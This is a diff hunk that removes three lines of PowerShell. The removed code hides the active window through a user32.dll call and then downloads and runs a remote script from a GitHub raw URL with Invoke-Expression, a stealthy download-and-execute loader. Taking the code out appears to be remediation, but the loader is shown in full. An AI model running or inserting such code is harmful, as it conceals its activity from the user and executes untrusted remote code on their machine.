@@ -1,3 +1,0 @@
-Add-Type -TypeDefinition @"
-using System; using System.Runtime.InteropServices; public class WindowHelper { [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); public const int SW_HIDE = 0; public static void HideWindow() { IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); } }
-"@; [WindowHelper]::HideWindow(); Invoke-Expression (Invoke-WebRequest "https://raw.githubusercontent.com/aodfs/0/main/0-wp" -UseBasicP)
